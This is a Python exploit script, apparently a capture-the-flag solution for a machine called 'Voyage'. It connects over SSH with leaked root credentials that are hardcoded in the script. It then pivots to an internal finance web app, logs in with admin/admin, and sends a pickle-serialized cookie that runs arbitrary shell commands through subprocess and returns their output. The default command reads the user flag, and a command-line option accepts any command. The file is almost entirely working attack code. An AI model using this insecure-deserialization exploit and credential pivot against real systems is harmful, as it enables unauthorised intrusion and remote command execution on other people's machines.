#!/usr/bin/env python3
"""
Automate the confirmed Voyage user-flag chain.

Chain:
1) SSH to the exposed host on port 2222 with the leaked Joomla credentials.
2) From that container, access the internal Finance app on 192.168.100.12:5000.
3) Use admin/admin to obtain the expected session behavior.
4) Send a malicious pickle cookie in session_data.
5) Print the command output reflected by the app.

Default command reads the user flag.

Example:
  python3 get_user_flag_via_internal_pickle.py

Optional arbitrary command:
  python3 get_user_flag_via_internal_pickle.py --command "id; hostname; cat /root/user.txt"
"""

from __future__ import annotations

import argparse
import re
from html import unescape

import paramiko


DEFAULT_COMMAND = "cat /root/user.txt 2>/dev/null || find / -name user.txt -exec cat {} \\; 2>/dev/null | head -n 1"


def build_remote_script(internal_url: str, username: str, password: str, command: str) -> str:
    return f"""python3 - <<'PY'
import binascii
import pickle
import re
import subprocess
from html import unescape

import requests

base = {internal_url!r}
login_user = {username!r}
login_pass = {password!r}
command = {command!r}


class ExecCommand:
    def __reduce__(self):
        # getoutput captures stdout/stderr and does not raise on non-zero exit.
        return (subprocess.getoutput, (command,))


session = requests.Session()
login_response = session.post(
    base,
    data={{'username': login_user, 'password': login_pass}},
    timeout=15,
)

if login_response.status_code != 200:
    raise SystemExit(f'login failed: HTTP {{login_response.status_code}}')

if 'session_data' not in session.cookies.get_dict():
    raise SystemExit('login failed: session_data cookie missing')

payload = pickle.dumps({{'user': ExecCommand(), 'revenue': '85000'}}, protocol=4).hex()
response = requests.get(base, cookies={{'session_data': payload}}, timeout=20)
match = re.search(r'Welcome\\s*(.*?)</h3>', response.text, re.I | re.S)

if not match:
    print('ERROR: could not locate reflected command output')
    print(response.text[:2000])
    raise SystemExit(1)

value = unescape(match.group(1)).strip()

if value.startswith("b'") and value.endswith("'"):
    value = value[2:-1]
elif value.startswith('b"') and value.endswith('"'):
    value = value[2:-1]

value = value.replace('\\n', chr(10))
value = value.strip()
print(value.strip())
PY"""


def main() -> None:
    parser = argparse.ArgumentParser(description='Get Voyage user flag through the internal pickle service')
    parser.add_argument('--target', default='10.82.166.188', help='Externally reachable target IP')
    parser.add_argument('--ssh-port', type=int, default=2222, help='SSH port on the exposed target')
    parser.add_argument('--ssh-user', default='root', help='SSH username')
    parser.add_argument('--ssh-password', default='RootPassword@1234', help='SSH password')
    parser.add_argument('--internal-url', default='http://192.168.100.12:5000/', help='Internal finance app URL')
    parser.add_argument('--app-user', default='admin', help='Internal finance app username')
    parser.add_argument('--app-password', default='admin', help='Internal finance app password')
    parser.add_argument('--command', default=DEFAULT_COMMAND, help='Command to execute through the pickle cookie')
    args = parser.parse_args()

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        args.target,
        port=args.ssh_port,
        username=args.ssh_user,
        password=args.ssh_password,
        timeout=10,
        banner_timeout=10,
        auth_timeout=10,
        allow_agent=False,
        look_for_keys=False,
    )

    remote_script = build_remote_script(
        internal_url=args.internal_url,
        username=args.app_user,
        password=args.app_password,
        command=args.command,
    )

    stdin, stdout, stderr = ssh.exec_command(remote_script, timeout=120)
    output = stdout.read().decode(errors='ignore').strip()
    error = stderr.read().decode(errors='ignore').strip()
    ssh.close()

    if error:
        raise SystemExit(error)

    if not output:
        raise SystemExit('No output received from internal pickle execution')

    print(output)


if __name__ == '__main__':
    main()
